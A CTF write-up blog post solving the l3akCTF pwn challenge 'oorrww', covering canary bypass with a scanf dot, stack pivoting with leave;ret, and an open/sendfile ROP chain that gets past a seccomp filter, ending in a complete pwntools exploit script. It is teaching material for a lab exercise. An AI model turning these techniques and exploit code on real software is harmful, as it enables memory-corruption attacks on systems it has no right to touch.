+++
author = "Lenart"
title = "oorrww - some other bytes to rop l3akCTF"
date = "2024-05-28"
description = "Everyone gets award."
tags = [
    "ctf",
    "pwn",
    "binary exploitation",
    "rop",
]
+++

# open/read/write or just open&send

This is a pwn challenge from the l3akCTF first edition. The challenge was supposed to be easy, but it was
quite tricky imo.

Without further ado, let's dive deep into the challenge.

First of all, we are given an ELF binary and a libc files beside a Dockerfile and docker-compose
the docker files are without interest.

## Enumeration:

Running the binary, we get this:

```shell
lenart@xorr0r0:~/ctf/oorrww_dist$ ./oorrww
here are gifts for you: 6.95282314239992e-310 6.606487017994984e-310!
input:
```

There are some double values which seem important, but we don't know what are they just yet.
It then takes our input, and seemingly it takes numbers as input not chars.


After playing around a bit, I realized it takes input in a loop, and after 22 inputs, it just crashes:

```shell
*** stack smashing detected ***: terminated
```

Great, is it? I mean we got a crash, but without even checking for the security flags, I can tell that
the stack canary is enabled. To prove the theory:

```shell
RELRO         Full RELRO 
STACK CANARY  Canary found 
NX            NX enabled     
PIE           PIE enabled     
```

Yes, it seems like a well-protected file. Let's finally open it in Binja.

Looking at the main function:

```C
000013b2  int64_t main()

000013c1      int32_t rdi
000013c1      int32_t var_bc = rdi
000013c7      int64_t rsi
000013c7      int64_t var_c8 = rsi
000013ce      void* fsbase
000013ce      int64_t rax = *(fsbase + 0x28)
000013e2      init()
000013ec      sandbox()
000013fb      void var_a8
000013fb      gifts(&var_a8)
00001455      for (int32_t i = 0; i s<= 0x15; i = i + 1)
00001416          puts("input:")
00001442          __isoc99_scanf(&data_2035, sx.q(i << 3) + &var_a8, &var_a8)
00001457      int64_t rax_8 = 0
00001469      if (rax != *(fsbase + 0x28))
0000146b          rax_8 = __stack_chk_fail()
00001471      return rax_8
```

So the binary isn't only protected by the classic security measures but is also [seccomp'ed](https://en.wikipedia.org/wiki/Seccomp)
Instead of manually checking the seccomp rules I used [seccomp-tools](https://github.com/david942j/seccomp-tools).

```shell
lenart@xorr0r0:~/ctf/oorrww_dist$ seccomp-tools dump ./oorrww
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

There are some old tricks to bypass seccomp rules, if it doesn't check for the arch type, 
we could simply call another arch instruction, for example, call int 0x80 instead of syscall.
Unfortunately for us, here it first checks for the arch if it isn't `ARCH_X86_64` it then jumps to `0008`
which kills the process. Another trick would be, if it didn't check for the syscall number greater than
`0x40000000` we could pass `0x40000000 + SYSCALL_NUMBER` because apparently the kernel ignores
the high-order bits in the syscall number. But again, it checks for syscall greater than `0x40000000`.
Next, it checks for `execve` and `execveat` syscalls, so `one gadget` is not an option here.

Interestingly, the name of the binary file, `oorrww` turned out to be an abbreviation for `open/read/write`, so we need
to open the flag, read it, and then write it to stdout.

Getting back to the binja, we have:
```chatinput
main()
...
gifts(&var_a8)
...

00001331  int64_t gifts(int64_t arg1)
00001341      void* fsbase
00001341      int64_t rax = *(fsbase + 0x28)
00001357      int64_t (* const var_28)() = __isoc99_scanf
0000137e      int512_t zmm1
0000137e      zmm1.o = zx.o(__isoc99_scanf)
00001396      printf("here are gifts for you: %.16g %.…", arg1, zmm1)
000013a0      int64_t rax_4 = rax - *(fsbase + 0x28)
000013a9      if (rax != *(fsbase + 0x28))
000013ab          rax_4 = __stack_chk_fail()
000013b1      return rax_4
```

So, the program leaks the address of the `var_a8` which is the buffer where we write and `__isoc99_scanf`.
The only thing is it prints the addresses as double, so we have to decode it to hex, I have this in my exploit:

```py
fleak = io.recvline().strip().decode().split()
buffer_leak = float.hex(float(fleak[5]))
buffer_leak = int(buffer_leak[5:17], 16)

scanf_leak = float.hex(float(fleak[6][:-1]))
scanf_leak = int(scanf_leak[5:17], 16)
```

Next in the binary we have:
```C
00001455      for (int32_t i = 0; i s<= 0x15; i = i + 1)
00001416          puts("input:")
00001442          __isoc99_scanf(&data_2035, sx.q(i << 3) + &var_a8, &var_a8)
```

It takes our inputs up to 22 times, and it will eventually overflow the buffer. But yet again, it takes
our input as double, so we need to pack it to hex and don't forget there is also the stack canary, so
before we hit the ret it crashes and kills the process.

Fortunately, I have had some experience with this kind of scenario in the past, and here is a [great article](https://rehex.ninja/posts/scanf-and-hateful-dot/)
that explains how to bypass stack canary using `scanf` dots.

We can imagine the scenario such as:
```
+---------+
|    A    | <- start of the buffer
|    A    |
|    A    |
|    A    |
|    A    |
|    A    |
|    .    | <- Bypass the canary because scanf woudldn't write .
|  0x1337 | <- return address we can control and jump whereever we want
+---------+
```

I think that is all good, but is it really?

Well, the thing is we really can write only 22 inputs of 8 bytes, which means we only have one byte after the canary
guard.

Not great, we have overflowed, but we can only control one redirection. Here is where I thought about [stack pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting).

Looking at the gadgets in the binary file we have:
```shell
lenart@xorr0r0:~/ctf/oorrww_dist$ ROPgadget --binary oorrww
0x00000000000012a3 : leave ; ret
```

That seems good, we can fill our buffer with a rop chain and then pivot the stack to the start of the buffer.

The scenario is something like this:

```
+---------+
|    A    | <- start of the buffer
|    A    |
|    A    |
|    A    |
|    A    |
|    A    |
|    .    | <- Bypass the canary because scanf woudldn't write .
|  0x1337 | <- address of leave; ret ---->----
+---------+                                  |
                                             |
                 rbp aka base pointer ->  +------+ <- A stack that we don't control
                                          |      |
                                          |      |
                                          |      |
                                          +------+
```

When calling `leave; ret` what happens under the hood is:
```asm
mov rsp, rbp
pop rbp
```
This means, it gives us direct access to the `rbp` which is exactly what we want.

So it becomes something like this:

```
+---------+ <---<----<----<----<----<----<----<----<----<----<----+
|  ROP1   | <- start of the buffer                                |
|  ROP2   |                                                       |
|  ROP1   |                                                       |
|  ROP3   |                                                       |
|  ROP4   |                                                       |
|  ROP5   |                                                       |
|    .    | <- Bypass the canary because scanf woudldn't write .  |
|  0x1337 | <- address of leave; ret ---->---->---->---->---->----+
```

### So now what?

As we control a stack and can chain a rop, we can now get libc base address using the `scanf` leaked address.

```
libc.base = scanf_leaked_address - scanf_offset_in_libc
```

And from this we can find every gadget in the libc using `libc.base + gadget_offset`.

The idea of ROP chain is as following:

```
pop rax     ; move the first value in the stack into rax
ret         ; pop return address from rbp and return to it.
```

So, as you can imagine, we can find a chain to set some specific registers and eventually call some 
syscalls or libc functions.

Ex:

```
                                            The stack                                                         
                                       +--------------------+                                                 
       pop rax ----------------------> |         2          |                                                 
                                       +--------------------+                                                 
       ret --------------------------> |        0x42        |                                                 
                                       +--------------------+                                                 
  0x42 pop rdi ----------------------> | 0x7478742e67616c66 + -> flag.txt----> actually should be the address 
                                       +--------------------+                  pointing to flag.txt but anyway
       ret --------------------------> |       0x1337       |                                                 
                                       +--------------------+                                                 
0x1337 pop rsi ----------------------> |         0          |                                                 
                                       +--------------------+                                                 
       ret --------------------------> |      0xca11        |                                                 
                                       +--------------------+                                                 
0xca11 syscall                                                                                                
```

The above figure shows how to set some registers and call open syscall. Under linux x64_86 each syscall
has a specific number and the rax register used to register the number of the desired syscall, which is 2
in the case of `open` according [this site](), 
or if you want to see them by yourself, you can navigate somewhere around `/usr/src/(kernel_name)/arch/x86/entry/syscalls/syscall_64.tbl`.

## Exploitation

Well, that was a long process of enumeration. Fortunately, we have overcome all the obstacles and can now start our exploit.

### The strategy

1. We can only write eight bytes at a time, so we can write `flag.txt` at the start of our buffer as this strings
is required by the open syscall, and we don't have it in the binary file.
2. Unfortunately for us, open requires a null terminated string which is quite logic. However, the stack has garbage on it, 
so when writing it at the start of the stack, it is not null terminated, and we have to sacrifice another eight
bytes on the stack for a null byte.
3. Sweet, we have written `flag.txt\0` so far. Now we can fill the rest of the stack with a rop chain to open/read/write it.
This one is a bit tricky I will come back to it later.
4. bypass the canary with a `.`.
5. Now, we have an extra 16 bytes to pivot the stack and change `ret` address. First, we put the address of the buffer
leaked by the program  `+ 8` (We don't want to jump to 0x0 null byte terminator of flag.txt as it is at the top of the stack)
so `leave` will pivot our stack to the start of our rop chain, and we will start it.
6. Finally, we change the `ret` to the `leave; ret` gadget address.

Getting back to the ROP chain, my first approach was to try to open, read, and then write to stdout.
But after some tries, I realized we were in a tiny stack space and these three syscalls required quite some
registers to be set up before calling them.

I could open and read the flag, but I needed another 16 bytes of space to write to stdout. I knew about `sendfile`
syscall but when searching for gadgets I didn't see one gadget that allows me to control it.

The man of `sendfile` says:
```
       sendfile() copies data between one file descriptor and another.
       Because this copying is done within the kernel, sendfile() is
       more efficient than the combination of read(2) and write(2),
       which would require transferring data to and from user space.

       in_fd should be a file descriptor opened for reading and out_fd
       should be a descriptor opened for writing.
```

And its prototype is as:
```C
       ssize_t sendfile(int out_fd, int in_fd, off_t *_Nullable offset,
                        size_t count);
```

And in syscall table page:
```
%rax 40
%rdi int out_fd
%rsi int in_fd 
%rdx loff_t *offset
%r10  size_t count
```

It is a bit special syscall, as it requires controlling r10 which is not very common in rop in my experience.

Here is the gadget allowed me to control it.

```
0x0000000000119170: endbr64; mov r10, rcx; mov eax, 0x28; syscall;
```

We don't bother with `endbr64` instruction, it was the only gadget that set `r10`, we first have to set `rcx` 
and then move it to `r10`, it even sets the syscall to `40` hex `0x28` which is sendfile and call syscall.

And that is all, with all these gadgets, we can turn the program to read a flag and send to us
instead of what it had to do initially.

Here is my final exploit:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

#context.terminal = 'kitty'
context.terminal = ["tmux", "splitw", "-h"]
logger = logging.getLogger(__name__)

exe = context.binary = ELF(args.EXE or './oorrww_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

io = process([exe.path])
#io = remote('193.148.168.30', 7666)
#gdb.attach(io, gdbscript=gdbscript)

fleak = io.recvline().strip().decode().split()
buffer_leak = float.hex(float(fleak[5]))
buffer_leak = int(buffer_leak[5:17], 16)

scanf_leak = float.hex(float(fleak[6][:-1]))
scanf_leak = int(scanf_leak[5:17], 16)

libc.address = scanf_leak - libc.symbols['__isoc99_scanf']
print("LIBC @ {}".format(hex(libc.address)))

rop = ROP(libc)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
pop_rdx = libc.address + 0x11f2e7
syscall = (rop.find_gadget(['syscall', 'ret']))[0]
leave_ret = (rop.find_gadget(['leave', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

gdbscript="""
b *{}
b *{}
""".format(leave_ret, syscall)
#gdb.attach(io, gdbscript=gdbscript)

def pack_input(data):
    val = p64(data).hex()
    return (struct.unpack('d', bytes.fromhex(val))[0])

def create_string(string):
    f = string.encode().hex()
    ba = bytearray.fromhex(f)
    ba.reverse()
    s = ''.join(format(x, "02x") for x in ba)
    return s

def send_address(addr):
    io.sendline("{}".format(pack_input(addr)))

print("Addr: scanf({}) buffer({})".format(hex(scanf_leak), hex(buffer_leak)))
def overflow(r):
    send_address(0x007478742e67616c66)
    send_address(0x00)
    
    # Open
    send_address(pop_rdi)
    send_address(buffer_leak)
    send_address(pop_rsi)
    send_address(0x0)
    send_address(pop_rax)
    send_address(0x2)
    send_address(syscall)
    
    # attempt to sendfile
    send_address(libc.address + 0x000000000003d1ee)
    send_address(0x200)
    send_address(pop_rsi)
    send_address(0x3)
    send_address(pop_rdi)
    send_address(1)
    send_address(libc.address + 0x0000000000119170)

    send_address(libc.sym.read)

    send_address(libc.sym.write)
    send_address(pop_rdi)

    io.sendline(b".")
    io.sendline("{}".format(pack_input(buffer_leak + 8)))


def first_stage():
    overflow(0);
    io.sendline("{}".format(pack_input(leave_ret)))

first_stage()
io.interactive()
```

By the way, the solution for the second challenge was quite similar; it was technically the same thing,
except for the leak part, which wasn't given initially.

One had just to leak them using an [old trick](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address).
The binary hadn't `pie` enabled so the addresses weren't randomized each time.
